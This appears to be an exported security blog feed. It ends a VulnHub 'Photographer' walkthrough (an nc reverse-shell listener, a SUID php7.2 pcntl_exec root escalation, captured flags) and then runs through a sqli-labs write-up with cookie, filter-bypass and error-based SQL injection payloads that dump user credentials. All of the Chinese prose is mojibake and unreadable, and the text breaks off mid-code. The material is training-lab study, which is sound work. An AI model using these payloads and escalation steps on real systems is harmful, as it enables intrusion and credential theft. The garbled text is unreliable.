<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>ç‚¹å‡»åå¼¹shell</code></p>
<img src="/2020/12/18/Photographer/image-20201218203246226.png" class>

<img src="/2020/12/18/Photographer/image-20201218203335202.png" class>

<p><code>æˆåŠŸget shell</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.129] from (UNKNOWN) [192.168.1.135] 56236</span><br><span class="line">Linux photographer 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"> 15:33:07 up  1:44,  0 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can&#x27;t access tty; job control turned off</span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure>

<h2 id="0x09-ææƒ"><a href="#0x09-ææƒ" class="headerlink" title="0x09.ææƒ"></a>0x09.ææƒ</h2><p><code>é¦–å…ˆå‡çº§shell</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span></span><br><span class="line">www-data@photographer:/$ </span><br><span class="line"></span><br><span class="line">www-data@photographer:/$</span><br></pre></td></tr></table></figure>

<p><code>å‡çº§äº¤äº’shell</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span></span><br><span class="line">www-data@photographer:/$ </span><br><span class="line"></span><br><span class="line">www-data@photographer:/$ ^Z</span><br><span class="line">[1]+  å·²åœæ­¢               nc -nvlp 6666</span><br><span class="line">root@JIYE:~# stty raw -echo</span><br><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line"></span><br><span class="line">www-data@photographer:/$ </span><br><span class="line">www-data@photographer:/$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@photographer:/$</span><br></pre></td></tr></table></figure>

<p><code>åœ¨daisaæ‰¾åˆ°user.txtçš„flag</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@photographer:/home/daisa$ cat user.txt </span><br><span class="line">d41d8cd98f00b204e9800998ecf8427e</span><br><span class="line">www-data@photographer:/home/daisa$</span><br></pre></td></tr></table></figure>

<p><code>suidææƒ</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><code>å¯ä»¥å‘ç°php7.2å¯ä»¥åˆ©ç”¨</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@photographer:/home/daisa$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/xorg/Xorg.wrap</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/sbin/pppd</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/php7.2</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line">www-data@photographer:/home/daisa$</span><br></pre></td></tr></table></figure>

<p><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvcGhwLw==">ææƒå‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p>
<p><code>æ‰¾åˆ°php7.2å‘½ä»¤çš„ç›®å½•ï¼Œåœ¨/usr/bin/php7.2</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@photographer:/$ whereis php7.2</span><br><span class="line">php7: /usr/bin/php7.2 /usr/share/php7.2-mysql /usr/share/php7.2-opcache /usr/share/php7.2-xmlrpc /usr/share/php7.2-json /usr/share/php7.2-readline /usr/share/php7.2-curl /usr/share/php7.2-common /usr/share/php7.2-sqlite3 /usr/share/php7.2-zip /usr/share/php7.2-intl /usr/share/php7.2-xml /usr/share/php7.2-gd /usr/share/php7.2-mbstring</span><br><span class="line">www-data@photographer:/$ </span><br></pre></td></tr></table></figure>

<p><code>exploit</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@photographer:/usr/bin$ ./php7.2 -r &quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="comment"># id</span></span></span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)</span><br><span class="line"><span class="meta">#</span><span class="bash"> whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">pwd</span></span></span><br><span class="line">/usr/bin</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> ~  </span></span><br><span class="line">/bin/sh: 5: cd: can&#x27;t cd to ~</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /root</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line">proof.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat proof.txt</span></span><br><span class="line">                                                                   </span><br><span class="line">                                .:/://::::///:-`                                </span><br><span class="line">                            -/++:+`:--:o:  oo.-/+/:`                            </span><br><span class="line">                         -++-.`o++s-y:/s: `sh:hy`:-/+:`                         </span><br><span class="line">                       :o:``oyo/o`. `      ```/-so:+--+/`                       </span><br><span class="line">                     -o:-`yh//.                 `./ys/-.o/                      </span><br><span class="line">                    ++.-ys/:/y-                  /s-:/+/:/o`                    </span><br><span class="line">                   o/ :yo-:hNN                   .MNs./+o--s`                   </span><br><span class="line">                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s                   </span><br><span class="line">                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/                  </span><br><span class="line">                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h                  </span><br><span class="line">                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.                 </span><br><span class="line">                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-                 </span><br><span class="line">                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o.                 </span><br><span class="line">                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`                 </span><br><span class="line">                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o                  </span><br><span class="line">                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`                  </span><br><span class="line">                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-                   </span><br><span class="line">                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.                    </span><br><span class="line">                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`                     </span><br><span class="line">                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-                       </span><br><span class="line">                        ./+:`:yh:dso/.+-++++ss+h++.:++-                         </span><br><span class="line">                           -/+/-:-/y+/d:yh-o:+--/+/:`                           </span><br><span class="line">                              `-///////////////:`                               </span><br><span class="line">                                                                                </span><br><span class="line"></span><br><span class="line">Follow me at: http://v1n1v131r4.com</span><br><span class="line">d41d8cd98f00b204e9800998ecf8427e</span><br><span class="line"><span class="meta">#</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqli_labs_Page2(advance)</title>
    <url>/2021/01/19/Sqli-labs-Page2-adv/</url>
    <content><![CDATA[<p><strong>Sqli_labs_Page2(advance)</strong></p>
<p> <strong>skip:åŸºç¡€ç¯‡ç¯å¢ƒä¸ºwindowsï¼Œä½†åœ¨æé«˜ç¯‡æœ‰äº›å…³å¡ä¼šå‡ºç°è§£æé”™è¯¯ï¼Œæœ¬ç¯‡ä½¿ç”¨dockeræ­å»ºçš„Linuxç¯å¢ƒ</strong></p>
<a id="more"></a>

<h2 id="0x01-Less-21-Cookieæ³¨å…¥-base64ç¼–ç -å•å¼•å·åŠ æ‹¬å·"><a href="#0x01-Less-21-Cookieæ³¨å…¥-base64ç¼–ç -å•å¼•å·åŠ æ‹¬å·" class="headerlink" title="0x01.Less-21 Cookieæ³¨å…¥ base64ç¼–ç  å•å¼•å·åŠ æ‹¬å·"></a>0x01.Less-21 Cookieæ³¨å…¥ base64ç¼–ç  å•å¼•å·åŠ æ‹¬å·</h2><p><code>demo payload</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">admin&#x27;) order by 4 -- -</span><br><span class="line">YWRtaW4nKSBvcmRlciBieSA0IC0tIC0=</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116142128479.png" class>

<p><code>çˆ†åº“</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0&#x27;) union select 1,2,database() -- -</span><br><span class="line">MCcpIHVuaW9uIHNlbGVjdCAxLDIsZGF0YWJhc2UoKSAtLSAt</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116142319509.png" class>

<blockquote>
<p>å…¶ä»–æ–¹å¼ä¸åœ¨èµ˜è¿°</p>
</blockquote>
<h2 id="0x02-Less-22-Cookieæ³¨å…¥-base64ç¼–ç -åŒå¼•å·"><a href="#0x02-Less-22-Cookieæ³¨å…¥-base64ç¼–ç -åŒå¼•å·" class="headerlink" title="0x02.Less-22 Cookieæ³¨å…¥ base64ç¼–ç  åŒå¼•å·"></a>0x02.Less-22 Cookieæ³¨å…¥ base64ç¼–ç  åŒå¼•å·</h2><blockquote>
<p>åŒLess-21ï¼Œå°†é—­åˆå­—ç¬¦æ¢ä¸ºåŒå¼•å·å³å¯</p>
</blockquote>
<h2 id="0x03-Less-23-åŸºäºæŠ¥é”™-è¿‡æ»¤æ³¨é‡Š"><a href="#0x03-Less-23-åŸºäºæŠ¥é”™-è¿‡æ»¤æ³¨é‡Š" class="headerlink" title="0x03.Less-23 åŸºäºæŠ¥é”™ è¿‡æ»¤æ³¨é‡Š"></a>0x03.Less-23 åŸºäºæŠ¥é”™ è¿‡æ»¤æ³¨é‡Š</h2><p><code>æ­¤é¢˜è¿‡æ»¤äº†--å’Œ#ï¼Œæµ‹è¯•å‘ç°é—­åˆå­—ç¬¦ä¸ºå•å¼•å·</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; or &#x27;1&#x27; = &#x27;1</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116145228775.png" class>

<p><code>æ—¢ç„¶è¿‡æ»¤äº†æ³¨é‡Šç¬¦é‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨äºŒæ¬¡æ³¨å…¥ç»“åˆ%00è¿›è¡Œæˆªæ–­</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; order by 4;%00</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116145628665.png" class>

<p><code>çˆ†åº“</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&#x27; union select 1,database(),user();%00</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116145754610.png" class>

<blockquote>
<p>å…¶ä»–æ–¹æ³•ä¸åœ¨èµ˜è¿°</p>
</blockquote>
<p><code>ä¹Ÿå¯ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,database() &#x27;</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116150158281.png" class>

<p><code>çˆ†è¡¨ï¼Œä»¥ä¸‹ä¸¤ä¸ªpayloadå‡å¯ä»¥</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),3 &#x27;</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() or &#x27;1&#x27;= &#x27;</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116150637871.png" class>

<p><code>çˆ†åˆ—å</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&#x27; union select 1,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),3 &#x27;</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; or &#x27;1&#x27;= &#x27;</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116151251994.png" class>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116151415888.png" class>

<p><code>çˆ†æ•°æ®</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&#x27; union select 1,(select username from users limit 0,1),3 &#x27;</span><br><span class="line">?id=0&#x27; union select 1,(select password from users limit 0,1),3 &#x27;</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,group_concat(username),group_concat(password) from users where 1 or &#x27;1&#x27; = &#x27;</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116151653100.png" class>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116151801467.png" class>

<h2 id="0x04-Less-24-äºŒæ¬¡æ³¨å…¥"><a href="#0x04-Less-24-äºŒæ¬¡æ³¨å…¥" class="headerlink" title="0x04.Less-24 äºŒæ¬¡æ³¨å…¥"></a>0x04.Less-24 äºŒæ¬¡æ³¨å…¥</h2><p><code>é¡µé¢å¯ä»¥æ³¨å†Œç”¨æˆ·</code></p>
<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116152202362.png" class>

<blockquote>
<p>æ€è·¯ä¸ºæ³¨å†Œä¸€ä¸ªadminâ€™ â€“ -æˆ–adminâ€™# ç”¨æˆ·ï¼Œç„¶åå†è¿›è¡Œä¿®æ”¹å¯†ç æ“ä½œ</p>
</blockquote>
<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116152940647.png" class>

<p><code>admin&#39; -- -ç™»å…¥</code></p>
<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116153011802.png" class>

<p><code>ä¿®æ”¹å¯†ç </code></p>
<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116153045305.png" class>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116153058942.png" class>

<p><code>é€€å‡ºä½¿ç”¨adminç™»å…¥</code></p>
<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116153139415.png" class>

<h2 id="0x05-Less-25-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤andä¸or-å•å¼•å·"><a href="#0x05-Less-25-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤andä¸or-å•å¼•å·" class="headerlink" title="0x05.Less-25 GET åŸºäºæŠ¥é”™ è¿‡æ»¤andä¸or å•å¼•å·"></a>0x05.Less-25 GET åŸºäºæŠ¥é”™ è¿‡æ»¤andä¸or å•å¼•å·</h2><p><code>è¿‡æ»¤äº†andä¸orå¯ä»¥ä½¿ç”¨åŒå†™ã€å¤§å°å†™æ··åˆã€å†…è”æ³¨é‡Šã€urlå…¨ç¼–ç è¿›è¡Œç»•è¿‡ï¼›andä¸orå¯ä»¥ä½¿ç”¨é€»è¾‘è¿ç®—ç¬¦(|| &amp;&amp;)è¿›è¡Œä»£æ›¿</code></p>
<blockquote>
<p>æµ‹è¯•å‘ç°åªèƒ½ä½¿ç”¨åŒå†™</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; oorrder by 4 -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116155639053.png" class>

<blockquote>
<p>å…¶ä»–è¿‡ç¨‹ä¸åœ¨èµ˜è¿°</p>
</blockquote>
<h2 id="0x06-Less-25a-GET-åŸºäºbool-è¿‡æ»¤andä¸or"><a href="#0x06-Less-25a-GET-åŸºäºbool-è¿‡æ»¤andä¸or" class="headerlink" title="0x06.Less-25a GET åŸºäºbool è¿‡æ»¤andä¸or"></a>0x06.Less-25a GET åŸºäºbool è¿‡æ»¤andä¸or</h2><p><code>ä¸Less-25ç›¸ä¼¼ï¼Œä½†æ²¡æœ‰å•å¼•å·</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=1 aandnd if(length(database())=8,sleep(5),1)-- -</span><br><span class="line"></span><br><span class="line">ä¹Ÿå¯ä»¥ä½¿ç”¨unionè”åˆæŸ¥è¯¢</span><br><span class="line"></span><br><span class="line">?id=0 union select 1,2,database() -- -</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210116161933977.png" class>

<blockquote>
<p>å…¶ä»–è¿‡ç¨‹ä¸åœ¨èµ˜è¿°</p>
</blockquote>
<h2 id="0x07-Less-26-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦"><a href="#0x07-Less-26-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦" class="headerlink" title="0x07.Less-26 GET åŸºäºæŠ¥é”™ è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦"></a>0x07.Less-26 GET åŸºäºæŠ¥é”™ è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦</h2><p><code>æŸ¥çœ‹æºç ï¼Œå‘ç°è¿‡æ»¤äº†ä»¥ä¸‹å­—ç¬¦</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);            <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//strip out /*</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out --</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);            <span class="comment">//Strip out #</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out slashes</span></span><br><span class="line">    <span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>æµ‹è¯•é—­åˆå­—ç¬¦ï¼Œç”±äºè¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ‰€ä»¥ä½¿ç”¨%a0æˆ–%0bä»£æ›¿ç©ºæ ¼ï¼Œè¿™é‡Œå‘ç°å•å¼•å·ä¸ºé—­åˆå­—ç¬¦</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&#x27;%0boorr%0b&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=0&#x27;%0boorr%0b&#x27;1&#x27;=&#x27;2</span><br><span class="line">?id=0&#x27;%a0oorr%a0&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=0&#x27;%a0oorr%a0&#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117215557295.png" class>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117215623266.png" class>

<p><code>æµ‹è¯•å­—æ®µæ•°ï¼Œç»“æœä¸º4ä¸ª</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&#x27;%0bunion%0bselect%0b1,2,3%0baandnd%0b&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=0&#x27;%0bunion%0bselect%0b1,2,3,4%0baandnd%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117220053016.png" class>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117220136142.png" class>

<p><code>çˆ†åº“ï¼Œandå¯ä»¥æ¢ä¸ºor</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&#x27;%0baandnd%0bupdatexml%0b(1,concat(0x7e,(select%0bdatabase()),0x7e),3)%0baandnd &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117221324429.png" class>

<p><code>çˆ†è¡¨</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&#x27;%0baandnd%0bupdatexml(1,concat(0x7e,(select%0btable_name%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=database()%0blimit%0b3,1),0x7e),1)%0baandnd&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117221948346.png" class>

<p><code>çˆ†åˆ—å</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&#x27;%0baandnd%0bupdatexml(1,concat(0x7e,(select%0bcolumn_name%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_schema=database()%0baandnd%0btable_name=&#x27;users&#x27;%0blimit%0b1,1),0x7e),1)%0baandnd&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">?id=0&#x27;%0baandnd%0bupdatexml(1,concat(0x7e,(select%0bcolumn_name%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_schema=database()%0baandnd%0btable_name=&#x27;users&#x27;%0blimit%0b2,1),0x7e),1)%0baandnd&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117222502329.png" class>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117222540036.png" class>

<p><code>çˆ†æ•°æ®</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&#x27;%0baandnd%0bupdatexml(1,concat(0x7e,(select%0busername%0bfrom%0busers%0blimit%0b0,1),0x7e),1)%0baandnd%0b&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">0&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117222910222.png" class>

<p><code>ä½†æ˜¯è¿™ç§æ–¹æ³•åªèƒ½ä¸€ä¸ªä¸€ä¸ªçˆ†ï¼Œå¯ä»¥ä½¿ç”¨group_concat()å‡½æ•°</code></p>
<p><code>çˆ†åº“</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&#x27;%0bunion%0bselect%0b1,2,database()%0baandnd%0b&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">?id=0&#x27;union%0bselect%0b1,database(),3%26%26&#x27;1&#x27;=&#x27;1    // %26ä¸º&amp;</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117224140184.png" class>

<p><code>çˆ†è¡¨</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&#x27;union%0bselect%0b1,group_concat(table_name),3%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=&#x27;security&#x27;%26%26%a0&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117224638239.png" class>

<p><code>çˆ†åˆ—å</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&#x27;union%0bselect%0b1,group_concat(column_name),3%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_name=&#x27;users&#x27;%26%26%a0&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117225229097.png" class>

<p><code>çˆ†æ•°æ®</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0&#x27;%0bunion%0bselect%0b1,group_concat(username,0x7e,passwoorrd),3%0bfrom%0busers%0bwhere%0b%271%27=%271</span><br><span class="line"></span><br><span class="line">// where 1=1 ä¸ºæ— çº¦æŸæŸ¥è¯¢</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117230259432.png" class>

<h2 id="0x08-Less-26a-GET-åŸºäºbool-è¿‡æ»¤-å•å¼•å·åŠ æ‹¬å·"><a href="#0x08-Less-26a-GET-åŸºäºbool-è¿‡æ»¤-å•å¼•å·åŠ æ‹¬å·" class="headerlink" title="0x08.Less-26a GET åŸºäºbool è¿‡æ»¤ å•å¼•å·åŠ æ‹¬å·"></a>0x08.Less-26a GET åŸºäºbool è¿‡æ»¤ å•å¼•å·åŠ æ‹¬å·</h2><p><code>åŒLess-26ç›¸åŒï¼Œéœ€è¦åœ¨å•å¼•å·ååŠ ä¸€ä¸ªæ‹¬å·</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?id=0%27)%0bunion%0bselect%0b1,group_concat(username,0x7e,passwoorrd),3%0bfrom%0busers%0bwhere(%271=1</span><br></pre></td></tr></table></figure>

<img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210117230816390.png" class>

<h2 id="0x09-Less-27-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦-å•å¼•å·"><a href="#0x09-Less-27-GET-åŸºäºæŠ¥é”™-è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦-å•å¼•å·" class="headerlink" title="0x09.Less-27 GET åŸºäºæŠ¥é”™ è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦ å•å¼•å·"></a>0x09.Less-27 GET åŸºäºæŠ¥é”™ è¿‡æ»¤ç©ºæ ¼ä¸å­—ç¬¦ å•å¼•å·</h2><p><code>æŸ¥çœ‹æºç å‘ç°åˆè¿‡æ»¤unionã€select</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);            <span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out union</span></span><br><span class="line">$id= 